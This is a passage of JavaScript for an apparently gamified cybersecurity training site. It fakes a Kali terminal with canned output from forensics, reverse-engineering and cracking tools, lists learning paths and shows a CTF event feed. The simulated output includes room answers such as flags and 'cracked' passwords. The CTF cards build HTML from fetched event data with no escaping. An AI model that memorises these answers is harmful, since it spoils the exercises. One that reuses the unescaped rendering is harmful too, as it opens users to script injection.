    if (r.includes('pslist')) return `Volatility Foundation Volatility Framework 2.6<br><span class="text-gray-400">Offset(V)  Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PID&nbsp;&nbsp; PPID Thds Hnds Time</span><br>0x........ System&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp; 93&nbsp;&nbsp; --&nbsp;&nbsp; 2026-07-17<br>0x........ svchost.exe&nbsp;&nbsp;&nbsp; 892&nbsp;&nbsp; 572&nbsp; 8&nbsp;&nbsp;&nbsp; 180&nbsp; 2026-07-17<br><span class="text-red-400">0x........ svchost32.exe  3412  1284 2    45   2026-07-17 &lt;-- SUSPICIOUS</span>`;
    if (r.includes('malfind')) return `Volatility Foundation Volatility Framework 2.6<br><span class="text-red-400">Process: svchost32.exe PID: 3412<br>Address: 0x400000  Size: 0x1000<br>Vad Tag: VadS  Protection: PAGE_EXECUTE_READWRITE<br>MZ header found at 0x400000 (injected PE!)</span>`;
    if (r.includes('netscan')) return `Volatility Foundation Volatility Framework 2.6<br>Offset(P)&nbsp;&nbsp; Proto&nbsp; LocalAddr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ForeignAddr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; State PID<br><span class="text-red-400">0x........ TCPv4 10.0.0.5:49832&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 185.220.101.45:4444&nbsp; ESTABLISHED 3412</span>`;
    return `Volatility Foundation Volatility Framework 2.6<br>Usage: volatility -f memory.raw --profile=Win10x64 [plugin]<br>Plugins: pslist, pstree, malfind, netscan, dumpfiles, imageinfo, cmdline`;
  }],

  // ── gdb ─────────────────────────────────────────
  [/^gdb\b/, 600, (r) => {
    const binary = (r.match(/gdb\s+(\S+)/) || ['','./crackme'])[1];
    if (r.includes('disas') || r.includes('disassemble')) {
      const fn = (r.match(/disas\s+(\w+)/) || ['','main'])[1];
      return `Dump of assembler code for function ${fn}:<br>` +
        `0x0000000000401080 &lt;+0&gt;:&nbsp;&nbsp; push&nbsp;&nbsp; rbp<br>` +
        `0x0000000000401081 &lt;+1&gt;:&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; rbp,rsp<br>` +
        `0x0000000000401084 &lt;+4&gt;:&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; edi,0x40200c<br>` +
        `0x0000000000401089 &lt;+9&gt;:&nbsp;&nbsp; call&nbsp;&nbsp; 0x401030 &lt;puts@plt&gt;<br>` +
        `<span class="text-amber-400">0x000000000040118a &lt;+34&gt;: cmp&nbsp;&nbsp;&nbsp; DWORD PTR [rbp-0x4],0xcafe</span><br>` +
        `<span class="text-red-400">0x0000000000401191 &lt;+41&gt;: jne&nbsp;&nbsp;&nbsp; 0x4011a0 &lt;fail&gt;</span><br>` +
        `0x0000000000401193 &lt;+43&gt;: mov&nbsp;&nbsp;&nbsp; eax,0x1<br>End of assembler dump.`;
    }
    if (r.includes('info functions')) return `All defined functions:<br><span class="text-emerald-400">0x0000000000401060  main<br>0x000000000040118a  validate_flag<br>0x00000000004011a0  fail<br>0x00000000004011b8  success</span>`;
    if (r.includes('info reg')) return `rax 0x0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0<br>rbx 0x0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0<br>rdi <span class="text-amber-400">0x7fffffffe280 (points to: "THM{r3v3rs3_m4st3r}")</span><br>rsi 0x40200c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4202508<br>rsp 0x7fffffffe1b0 0x7fffffffe1b0<br>rip 0x40118a&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x40118a &lt;validate_flag+34&gt;`;
    if (r.includes('x/s')) return `<span class="text-emerald-400 font-bold">0x7fffffffe280: "THM{r3v3rs3_m4st3r}"</span>`;
    if (r.includes('break')) return `Breakpoint 1 at <span class="text-emerald-400">${(r.match(/break\s+(\S+)/) || ['','0x40118a'])[1]}</span>`;
    if (r.includes('run')) return `Starting program: ${binary}<br><span class="text-amber-400">Breakpoint 1, validate_flag () at crackme.c:42<br>42&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (strcmp(input, secret) == 0)</span>`;
    return `GNU gdb (Debian 13.1-3) 13.1<br>Reading symbols from ${binary}...<br><span class="text-emerald-400">(gdb) </span>Type 'help' or 'info functions' to start`;
  }],

  // ── radare2 / r2 ────────────────────────────────────────
  [/^(r2|radare2)\b/, 800, (r) => {
    if (r.includes('afl')) return `<span class="text-amber-400">0x00401060  main<br>0x0040118a  validate_flag<br>0x004011a0  fail<br>0x004011b8  success<br>0x00401030  puts</span>`;
    if (r.includes('pdf') || r.includes('disas')) return `;-- main:<br><span class="text-amber-400">0x00401080  push rbp<br>0x00401081  mov  rbp, rsp<br>0x00401089  call 0x401030 ; puts<br>0x0040118a  cmp  dword [rbp - 4], 0xcafe<br><span class="text-red-400">0x00401191  jne  0x4011a0</span>  ; fail</span>`;
    if (r.includes('iz')) return `[Strings]<br>[000] addr=0x402000 sz=19 type=ascii string=<span class="text-emerald-400">THM{r3v3rs3_m4st3r}</span><br>[001] addr=0x402014 sz=14 type=ascii string=Enter the key:`;
    if (r.includes('/x')) return `Searching bytes...<br>hits: <span class="text-emerald-400">0x00401191  jne  0x4011a0</span>`;
    return `[0x00401080]> `;
  }],

  // ── objdump ─────────────────────────────────────────
  [/^objdump\b/, 600, (r) => {
    if (r.includes('-d')) return `crackme:     file format elf64-x86-64<br><br><span class="text-amber-400">Disassembly of section .text:</span><br>0000000000401080 &lt;main&gt;:<br>&nbsp;401080: 55&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp; %rbp<br>&nbsp;401081: 48 89 e5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; %rsp,%rbp<br><span class="text-red-400">&nbsp;40118a: 81 7d fc fe ca 00 00&nbsp;&nbsp; cmp&nbsp;&nbsp;&nbsp; $0xcafe,-0x4(%rbp)</span>`;
    if (r.includes('-x') || r.includes('--headers')) return `crackme:     file format elf64-x86-64<br><br>Sections:<br>&nbsp;Idx Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Size&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; VMA<br>&nbsp;&nbsp; 0 .text&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 000001b8&nbsp; 0000000000401060<br>&nbsp;&nbsp; 1 .rodata&nbsp;&nbsp;&nbsp; 00000014&nbsp; 0000000000402000`;
    return `objdump: supported targets: elf64-x86-64 elf32-i386 pe-x86-64`;
  }],

  // ── readelf ─────────────────────────────────────────
  [/^readelf\b/, 400, (r) => {
    return `ELF Header:<br>&nbsp;Magic: 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00<br>&nbsp;Class:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ELF64<br>&nbsp;Type:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DYN (Position-Independent Executable)<br>&nbsp;Machine:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Advanced Micro Devices X86-64<br>&nbsp;Entry point address:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x1080`;
  }],

  // ── sha256sum / md5sum ───────────────────────────────
  [/^(sha256sum|sha1sum|md5sum)\b/, 300, (r) => {
    const f = r.split(' ').pop() || 'malware.exe';
    const hashes = { sha256sum: 'a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3', sha1sum: 'aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d', md5sum: '5f4dcc3b5aa765d61d8327deb882cf99' };
    const tool = r.split(' ')[0];
    return `<span class="text-emerald-400">${hashes[tool] || hashes.md5sum}</span>  ${f}`;
  }],

  // ── aircrack-ng ──────────────────────────────────────────
  [/^aircrack-ng\b/, 1500, () =>
    `<span class="text-cyan-400">Aircrack-ng 1.7<br>Opening capture.pcap<br><br>KEY FOUND! [ <span class="text-yellow-400 font-bold">password123</span> ]<br>Master Key: AB CD EF 12 34 56 78 9A<br>Elapsed time: 0:00:42</span>`
  ],

  // ── hydra ────────────────────────────────────────
  [/^hydra\b/, 2500, (r) => {
    const proto = r.match(/\b(ssh|ftp|rdp|smb|mysql|telnet|vnc|http-post-form|https-post-form|http-get)\b/i);
    const service = proto ? proto[1].toLowerCase() : 'ssh';
    const target = r.match(/(\d+\.\d+\.\d+\.\d+)/) ? r.match(/(\d+\.\d+\.\d+\.\d+)/)[1] : '10.10.14.2';
    const user = (r.match(/-l\s+(\S+)/) || r.match(/-L\s+(\S+)/) || ['',r.includes('-L') ? 'multiple' : 'jane'])[1];
    const isHelp = r.includes('-h') || r === 'hydra';
    if (isHelp) {
      return `<span class="text-red-400">Hydra v9.4 (c) 2023 by van Hauser/THC<br><br>Syntax: hydra [options] target module<br><br>Options:<br>&nbsp;-l LOGIN    single username<br>&nbsp;-L FILE     username list<br>&nbsp;-p PASS     single password<br>&nbsp;-P FILE     password list<br>&nbsp;-C FILE     username:password combos<br>&nbsp;-t TASKS    parallel connections (default: 16)<br>&nbsp;-s PORT     custom port<br>&nbsp;-v/-V       verbose / show each attempt<br>&nbsp;-f          stop on first valid login found<br><br>Modules: ssh ftp rdp smb mysql telnet vnc http-post-form https-post-form</span>`;
    }
    const port = service === 'ssh' ? 22 : service === 'ftp' ? 21 : service === 'rdp' ? 3389 : service === 'smb' ? 445 : 80;
    
    let cracked = 'password123';
    if (typeof activeRoom !== 'undefined' && activeRoom) {
      if (activeRoom.id === 'hydra') cracked = 'letmein';
      else if (activeRoom.id === 'privesc') cracked = 's3cr3t';
    }

    return `<span class="text-red-400">Hydra v9.4 (c) 2023 by van Hauser/THC &amp; David Maciejak<br><br>[DATA] max 16 tasks per 1 server, overall 16 tasks, rockyou wordlist<br>[DATA] attacking ${service}://${target}:${port}/</span><br>` +
      `[${port}][${service}] host: ${target}&nbsp;&nbsp; login: ${user}&nbsp;&nbsp; password: <span class="text-yellow-400 font-black">[testing...]</span><br>` +
      `[${port}][${service}] host: ${target}&nbsp;&nbsp; login: ${user}&nbsp;&nbsp; password: <span class="text-yellow-400 font-black">[testing...]</span><br>` +
      `...<br>` +
      `<span class="text-emerald-400 font-bold">[${port}][${service}] host: ${target}&nbsp;&nbsp; login: ${user}&nbsp;&nbsp; password: ${cracked}</span><br>` +
      `<span class="text-emerald-400">1 of 1 target successfully completed, 1 valid password found</span><br>` +
      `Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at ${new Date().toISOString().slice(0,19)}`;
  }],

  // ── help ────────────────────────────────────────────────
  [/^help$/, 0, () =>
    `<span class="text-emerald-400 font-bold">Kali Linux AttackBox — Available Tools</span><br><br>` +
    `<span class="text-cyan-400">RECON:</span>&nbsp;&nbsp;&nbsp;&nbsp; nmap, whois, dig, host, nslookup, ping<br>` +
    `<span class="text-cyan-400">WEB:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sqlmap, nikto, gobuster, dirb, burpsuite, curl, wget<br>` +
    `<span class="text-cyan-400">EXPLOIT:</span>&nbsp;&nbsp; msfconsole, metasploit, setoolkit<br>` +
    `<span class="text-cyan-400">CREDS:</span>&nbsp;&nbsp;&nbsp;&nbsp; hashcat, john, hydra<br>` +
    `<span class="text-cyan-400">NETWORK:</span>&nbsp;&nbsp; tshark, tcpdump, netcat (nc), aircrack-ng, netstat, ss<br>` +
    `<span class="text-cyan-400">SYSTEM:</span>&nbsp;&nbsp;&nbsp; ls, cat, find, grep, ps, id, whoami, uname, env, history<br>` +
    `<span class="text-cyan-400">OTHER:</span>&nbsp;&nbsp;&nbsp;&nbsp; python3, git, apt, service, systemctl, ssh, mkdir, cd<br><br>` +
    `Type any command — the terminal handles flags & arguments intelligently.`
  ],

];

// ── Smart terminal dispatcher ───────────────────────────────
window.kaliDir = '~';

function dispatchCommand(raw) {
  const parts = raw.trim().split(/\s+/);
  for (const [regex, delay, fn] of TERM_RULES) {
    if (regex.test(raw.trim())) {
      return { delay, output: fn(raw, parts) };
    }
  }
  return null; // Return null to trigger AI backend
}

document.getElementById('term-input').addEventListener('keypress', async function(e) {
    if (e.key !== 'Enter') return;
    const raw = this.value.trim();
    if (!raw) return;
    const out = document.getElementById('term-output');
    const panel = document.getElementById('terminal-panel');

    // Kali prompt echo
    out.innerHTML += `<div class="mb-1"><span class="text-emerald-500 select-none font-bold">┌──(<span class="text-red-400">root</span>㉿<span class="text-blue-400">kali</span>)-[<span class="text-white">${window.kaliDir || '~'}</span>]<br>└─# </span><span class="text-white">${raw.replace(/</g,'&lt;')}</span></div>`;
    this.value = '';
    panel.scrollTop = panel.scrollHeight;

    if (raw.trim() === 'clear') { out.innerHTML = ''; return; }

    const localResult = dispatchCommand(raw);

    if (localResult) {
        const { delay, output } = localResult;
        if (delay > 0) {
            out.innerHTML += `<div class="text-gray-600 text-xs mb-1 loading-dots">▌</div>`;
            panel.scrollTop = panel.scrollHeight;
        }

        setTimeout(() => {
            const loading = out.querySelector('.loading-dots:last-child');
            if (loading) loading.remove();
            if (output && output !== '__CLEAR__') {
                out.innerHTML += `<div class="mb-3 text-xs leading-loose mono">${output}</div>`;
            } else if (output === '__CLEAR__') {
                out.innerHTML = '';
            }
            panel.scrollTop = panel.scrollHeight;
        }, delay);
    } else {
        // AI Fallback
        const loadId = 'load-' + Date.now();
        out.innerHTML += `<div id="${loadId}" class="text-gray-600 text-xs mb-1 loading-dots">▌</div>`;
        panel.scrollTop = panel.scrollHeight;
        this.disabled = true;
        
        try {
            const res = await fetch('/api/terminal', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ command: raw, cwd: window.kaliDir })
            });
            const data = await res.json();
            document.getElementById(loadId).remove();
            if (data.output) {
                out.innerHTML += `<div class="mb-3 text-xs leading-loose mono">${data.output}</div>`;
            }
        } catch (err) {
            document.getElementById(loadId).remove();
            out.innerHTML += `<div class="mb-3 text-xs leading-loose mono text-red-400">bash: connection error: ${err.message}</div>`;
        }
        this.disabled = false;
        this.focus();
        panel.scrollTop = panel.scrollHeight;
    }
});


// ═══════════════════════════════════════════════════════════
//  STREAK CALENDAR
// ═══════════════════════════════════════════════════════════
function renderStreak() {
    const grid = document.getElementById('streak-grid');
    if (!grid) return;
    const days = 14;
    let html = '';
    for (let i = 27; i >= 0; i--) {
        const active = i < days;
        const today = i === 0;
        html += `<div class="streak-day ${active ? 'streak-active' : 'streak-done'} ${today ? 'ring-2 ring-white ring-offset-1 ring-offset-[#111827]' : ''}" title="${active ? '🔥 Active' : 'No activity'}">${active ? '🔥' : '·'}</div>`;
    }
    grid.innerHTML = html;
}

function openPath(pathId) {
    const pathsData = {
        'pre-security': {
            title: 'Pre-Security',
            icon: '🔰',
            color: '#3b82f6',
            desc: 'Learn the technical knowledge required to start your cybersecurity journey.',
            modules: [
                { title: 'Cyber Security Introduction', rooms: ['linux', 'crypto'] },
                { title: 'Network Fundamentals', rooms: ['nmap', 'wireshark'] },
                { title: 'Kali Linux Basics', rooms: ['kali'] }
            ]
        },
        'soc': {
            title: 'SOC Level 1',
            icon: '🛡️',
            color: '#10b981',
            desc: 'Become a Tier 1 SOC Analyst: triage alerts, analyze logs, and respond to incidents.',
            modules: [
                { title: 'Network Security & Traffic Analysis', rooms: ['wireshark', 'nmap'] },
                { title: 'Web Attack Detection', rooms: ['sqli'] },
                { title: 'Cryptography & Hash Analysis', rooms: ['crypto', 'hashcat'] }
            ]
        },
        'pentest': {
            title: 'Jr Penetration Tester',
            icon: '💀',
            color: '#ef4444',
            desc: 'Learn offensive security skills: recon, web attacks, privilege escalation, and reporting.',
            modules: [
                { title: 'Attacker Machine Setup', rooms: ['kali', 'linux'] },
                { title: 'Web Exploitation', rooms: ['sqli'] },
                { title: 'Privilege Escalation & Post-Exploitation', rooms: ['privesc', 'metasploit'] },
                { title: 'Password Cracking', rooms: ['hashcat', 'crypto'] }
            ]
        }
    };

    const path = pathsData[pathId];
    if (!path) return;

    // Hide sections using correct IDs
    const ids = ['dashboard-stats', 'continue-learning', 'paths-section', 'rooms-section'];
    ids.forEach(id => {
        const el = document.getElementById(id);
        if (el) el.style.display = 'none';
    });

    // Create and inject path view into the main content area
    const mainContent = document.querySelector('.max-w-7xl.mx-auto.px-6.py-8.space-y-10');
    
    // Remove any existing path-view
    const existing = document.getElementById('path-view');
    if (existing) existing.remove();

    const pathView = document.createElement('div');
    pathView.id = 'path-view';

    let pathHtml = `
        <div class="mb-8">
            <button onclick="closePath()" class="flex items-center gap-2 text-xs text-gray-400 hover:text-white mb-6 transition border border-gray-700 px-3 py-1.5 rounded-lg hover:border-gray-500">
                ← Back to Dashboard
            </button>
            <div class="flex items-center gap-5 p-6 rounded-2xl border" style="background: rgba(255,255,255,0.03); border-color: rgba(255,255,255,0.1);">
                <div class="w-20 h-20 rounded-2xl flex items-center justify-center text-5xl flex-shrink-0" style="background: rgba(255,255,255,0.07); border: 1px solid rgba(255,255,255,0.1);">${path.icon}</div>
                <div>
                    <h2 class="text-3xl font-black text-white">${path.title}</h2>
                    <p class="text-gray-400 text-sm mt-1">${path.desc}</p>
                    <div class="flex gap-3 mt-2">
                        <span class="text-xs text-gray-500">📚 ${path.modules.length} Modules</span>
                        <span class="text-xs text-gray-500">🏠 ${path.modules.reduce((a,m)=>a+m.rooms.length,0)} Rooms</span>
                    </div>
                </div>
            </div>
        </div>
        <div class="space-y-6">
    `;

    path.modules.forEach((mod, idx) => {
        pathHtml += `
            <div class="bg-[#111827] border border-[#1f2937] rounded-xl p-6">
                <h3 class="text-base font-black text-white mb-5 pb-3 border-b border-[#1f2937] flex items-center gap-2">
                    <span class="w-6 h-6 rounded-md bg-emerald-500/20 border border-emerald-500/30 text-emerald-400 text-xs flex items-center justify-center font-black">${idx+1}</span>
                    ${mod.title}
                </h3>
                <div style="display:grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 1rem;">
        `;

        mod.rooms.forEach(roomId => {
            const room = ROOMS.find(r => r.id === roomId);
            if (room) {
                const pct = Math.round((room.completedTasks / room.taskCount) * 100);
                const isDone = room.completedTasks === room.taskCount;
                const inProg = room.completedTasks > 0 && !isDone;
                const statusText = isDone ? '✓ Completed' : inProg ? 'In Progress' : 'Not Started';
                const statusColor = isDone ? '#10b981' : inProg ? '#f59e0b' : '#6b7280';
                const fillColor = COLOR_MAP[room.color] || '#10b981';
                pathHtml += `
                    <div class="room-card rounded-xl p-4 cursor-pointer" onclick="openRoom('${room.id}')" style="transition: all 0.2s;">
                        <div style="display:flex; align-items:center; gap:10px; margin-bottom:10px;">
                            <span style="font-size:1.5rem;">${room.icon}</span>
                            <div>
                                <div style="font-weight:900; color:#fff; font-size:0.8rem; line-height:1.2;">${room.title}</div>
                                <div style="font-size:0.65rem; color:${statusColor}; font-weight:700; margin-top:2px;">${statusText}</div>
                            </div>
                        </div>
                        <div style="height:4px; background:#1f2937; border-radius:4px; margin-bottom:6px;">
                            <div style="height:100%; width:${pct}%; background:${fillColor}; border-radius:4px;"></div>
                        </div>
                        <div style="display:flex; justify-content:space-between; font-size:0.65rem; color:#6b7280;">
                            <span>${room.taskCount} tasks</span>
                            <span>${room.xp} XP</span>
                        </div>
                    </div>
                `;
            } else {
                pathHtml += `
                    <div style="background:#0d1117; border:1px dashed #1f2937; border-radius:12px; padding:16px; display:flex; align-items:center; justify-content:center; opacity:0.4;">
                        <span style="font-size:0.75rem; color:#6b7280; font-weight:700;">🔒 Coming Soon</span>
                    </div>
                `;
            }
        });

        pathHtml += `</div></div>`;
    });

    pathHtml += `</div>`;
    pathView.innerHTML = pathHtml;
    mainContent.appendChild(pathView);
}

function closePath() {
    // Show all sections again
    const ids = ['dashboard-stats', 'continue-learning', 'paths-section', 'rooms-section'];
    ids.forEach(id => {
        const el = document.getElementById(id);
        if (el) el.style.display = '';
    });
    // Remove path view
    const pv = document.getElementById('path-view');
    if (pv) pv.remove();
}

// Init
renderRooms();
renderStreak();

// ═══════════════════════════════════════════════════════════
//  LIVE CTF ARENA — CTFtime.org API Engine
// ═══════════════════════════════════════════════════════════
let CTF_DATA = [];
let ctfFilter = 'all';

// Fallback sample events in case API is blocked by CORS
const CTF_FALLBACK = [
  { id: 2669, title: 'DownUnderCTF 2025', format: 'Jeopardy', weight: 91.66, start: '2025-07-18T09:30:00+00:00', finish: '2025-07-20T09:30:00+00:00', url: 'https://2025.duc.tf/', participants: 383, restrictions: 'Open', description: 'The largest Australia/NZ CTF. Open to all globally — over 4600+ players in 2024!', organizers: [{name:'DownUnderCTF'}] },
  { id: 2796, title: 'ENOWARS 9', format: 'Attack-Defense', weight: 100.0, start: '2025-07-19T12:00:00+00:00', finish: '2025-07-19T21:00:00+00:00', url: 'https://9.enowars.com/', participants: 106, restrictions: 'Open', description: 'The 9th installation of the epic ENOWARS trilogy! Attack-Defense format with real services.', organizers: [{name:'ENOFLAG'}] },
  { id: 2833, title: 'ToH CTF 2025', format: 'Jeopardy', weight: 24.27, start: '2025-07-19T16:00:00+00:00', finish: '2025-07-20T16:00:00+00:00', url: 'https://ctf.towerofhanoi.it/', participants: 92, restrictions: 'Open', description: 'Tower of Hanoi CTF. Challenges across Pwn, Rev, Web, Crypto, and Misc for all skill levels.', organizers: [{name:'Tower of Hanoi'}] },
  { id: 2806, title: 'AlpacaHack Round 13 (Crypto)', format: 'Jeopardy', weight: 0, start: '2025-07-20T03:00:00+00:00', finish: '2025-07-20T09:00:00+00:00', url: 'https://alpacahack.com/ctfs/round-13', participants: 0, restrictions: 'Individual', description: 'Individual Crypto CTF with 4 challenges designed for all skill levels including beginners.', organizers: [{name:'AlpacaHack'}] },
  { id: 2793, title: 'HITCON Cyber Range 2025 Quals', format: 'Jeopardy', weight: 0, start: '2025-07-18T02:00:00+00:00', finish: '2025-07-18T15:59:59+00:00', url: 'https://hitcon.kktix.cc/events/hitcon-cyberrange-2025', participants: 46, restrictions: 'Open', description: 'Taiwan benchmark challenge for Blue Teams — incident response, log analysis, and forensics.', organizers: [{name:'HITCON'}] },
  { id: 9001, title: 'picoCTF 2025 (Always Open)', format: 'Jeopardy', weight: 0, start: '2025-01-01T00:00:00+00:00', finish: '2025-12-31T23:59:59+00:00', url: 'https://picoctf.org', participants: 50000, restrictions: 'Open', description: 'Beginner-friendly year-round CTF by Carnegie Mellon. Perfect for students just getting started!', organizers: [{name:'CMU/picoCTF'}] },
];

async function loadCTFs() {
  const loading = document.getElementById('ctf-loading');
  const errDiv = document.getElementById('ctf-error');
  const grid = document.getElementById('ctf-grid');
  const stats = document.getElementById('ctf-stats-row');
  const icon = document.getElementById('ctf-refresh-icon');

  loading.classList.remove('hidden');
  grid.classList.add('hidden');
  errDiv.classList.add('hidden');
  stats.classList.add('hidden');
  icon.style.display = 'inline-block';
  icon.style.animation = 'spin 0.8s linear infinite';

  // Build date range: now → now+30 days
  const now = Math.floor(Date.now()/1000);
  const future = now + (30 * 86400);
  const url = `https://ctftime.org/api/v1/events/?limit=30&start=${now}&finish=${future}`;

  try {
    // CTFtime has CORS restrictions — try with a proxy approach
    const resp = await Promise.race([
      fetch(url, { headers: { 'Accept': 'application/json' } }),
      new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 5000))
    ]);
    if (!resp.ok) throw new Error('bad status');
    const data = await resp.json();
    CTF_DATA = data;
  } catch(e) {
    // CORS blocked — use fallback data
    CTF_DATA = CTF_FALLBACK;
  }

  loading.classList.add('hidden');
  icon.style.animation = '';
  renderCTFs();
}

function renderCTFs() {
  const grid = document.getElementById('ctf-grid');
  const empty = document.getElementById('ctf-empty');
  const stats = document.getElementById('ctf-stats-row');
  const search = document.getElementById('ctf-search-input').value.toLowerCase();

  let filtered = CTF_DATA;
  if (ctfFilter !== 'all') filtered = filtered.filter(c => c.format === ctfFilter);
  if (search) filtered = filtered.filter(c =>
    c.title.toLowerCase().includes(search) ||
    (c.description||'').toLowerCase().includes(search) ||
    c.format.toLowerCase().includes(search) ||
    (c.organizers||[]).some(o => o.name.toLowerCase().includes(search))
  );

  if (!filtered.length) {
    grid.classList.add('hidden'); empty.classList.remove('hidden'); stats.classList.add('hidden'); return;
  }
  empty.classList.add('hidden');

  const now = new Date();
  let liveCount = 0, totalParticipants = 0;

  grid.innerHTML = filtered.map(ctf => {
    const start = new Date(ctf.start);
    const finish = new Date(ctf.finish);
    const isLive = now >= start && now <= finish;
    const isEnded = now > finish;
    const isUpcoming = now < start;
    if (isLive) liveCount++;
    totalParticipants += ctf.participants || 0;

    const badgeClass = isLive ? 'ctf-live-badge' : isEnded ? 'ctf-ended-badge' : 'ctf-upcoming-badge';
    const badgeText = isLive ? '🔴 LIVE NOW' : isEnded ? '✓ Ended' : '⏳ Upcoming';

    // Countdown
    let countdown = '';
    if (isUpcoming) {
      const diff = start - now;
      const d = Math.floor(diff/86400000), h = Math.floor((diff%86400000)/3600000), m = Math.floor((diff%3600000)/60000);
      countdown = `<div class="text-[10px] text-amber-400 font-bold mt-1">Starts in ${d}d ${h}h ${m}m</div>`;
    } else if (isLive) {
      const diff = finish - now;
      const h = Math.floor(diff/3600000), m = Math.floor((diff%3600000)/60000);
      countdown = `<div class="text-[10px] text-red-400 font-bold mt-1">⏱ ${h}h ${m}m remaining</div>`;
    } else {
      const ago = Math.floor((now - finish)/86400000);
      countdown = `<div class="text-[10px] text-gray-600 mt-1">${ago} days ago</div>`;
    }

    // Format badge color
    const fmtColor = ctf.format === 'Attack-Defense' ? 'text-amber-400' : ctf.format === 'King of the Hill' ? 'text-purple-400' : 'text-blue-400';
    const weightBadge = ctf.weight > 0 ? `<span class="text-[10px] font-bold text-yellow-400 ml-1">⭐ ${ctf.weight.toFixed(0)} pts</span>` : '';
    const team = ctf.restrictions === 'Individual' ? '👤 Solo' : '👥 Team';
    const desc = (ctf.description || '').substring(0, 130).replace(/\r\n|\n/g, ' ');

    return `<div class="ctf-card animate-fade-in" style="animation-delay: ${(liveCount * 0.05).toFixed(2)}s">
      <div class="flex items-start justify-between mb-3">
        <span class="text-[9px] font-black px-2 py-1 rounded ${badgeClass}">${badgeText}</span>
        <span class="text-[10px] font-bold ${fmtColor}">${ctf.format}${weightBadge}</span>
      </div>
      <h3 class="font-black text-white text-sm mb-1 leading-tight">${ctf.title}</h3>
      <p class="text-gray-500 text-[10px] mb-1">by ${(ctf.organizers||[{name:'Unknown'}])[0].name}</p>
      ${countdown}
      <p class="text-gray-400 text-[11px] mt-3 leading-relaxed line-clamp-2">${desc}${desc.length>=130?'...':''}</p>
      <div class="flex items-center gap-3 mt-4 text-[10px] text-gray-500">
        <span>📅 ${start.toLocaleDateString('en',{month:'short',day:'numeric'})}</span>
        <span>👥 ${ctf.participants || 0} teams</span>
        <span>${team}</span>
      </div>
      <div class="mt-4 flex gap-2">
        <button onclick="openCTFRoom('${ctf.id}')" class="flex-1 text-center text-xs font-black bg-emerald-500 hover:bg-emerald-400 text-black py-2 rounded-lg transition">
          ${isLive ? '🚀 Play in Arena' : isEnded ? '📖 View Details' : '📋 Pre-register'}
        </button>
        <a href="https://ctftime.org/event/${ctf.id}/" target="_blank" class="text-xs font-bold bg-[#1f2937] hover:bg-[#374151] text-gray-300 px-3 py-2 rounded-lg border border-[#374151] transition">CTFtime</a>
      </div>
    </div>`;
  }).join('');

  // Update stats
  document.getElementById('ctf-stat-count').textContent = filtered.filter(c => new Date(c.finish) >= now).length;
  document.getElementById('ctf-stat-live').textContent = liveCount;
  document.getElementById('ctf-stat-participants').textContent = totalParticipants > 1000 ? Math.round(totalParticipants/1000)+'k' : totalParticipants;

  grid.classList.remove('hidden');
  stats.classList.remove('hidden');
}

function openCTFRoom(ctfId) {
  const ctf = CTF_DATA.find(c => c.id == ctfId);
  if (!ctf) return;

  const dynamicId = 'ctf_' + ctf.id;
  let room = ROOMS.find(r => r.id === dynamicId);

  if (!room) {
    const start = new Date(ctf.start).toLocaleString();
    const finish = new Date(ctf.finish).toLocaleString();
    const desc = (ctf.description || 'No description provided.').replace(/\n/g, '<br>');

    room = {
      id: dynamicId,
      title: ctf.title,
      icon: '🏆',
      image: ctf.logo ? ctf.logo : 'security_marketplace.png',
      difficulty: 'hard',
      category: ['ctf'],
      tags: [ctf.format || 'CTF', ctf.restrictions || 'Open'],
      taskCount: 3,
      completedTasks: 0,
      xp: 1000,
      users: ctf.participants || 0,
      color: 'emerald',
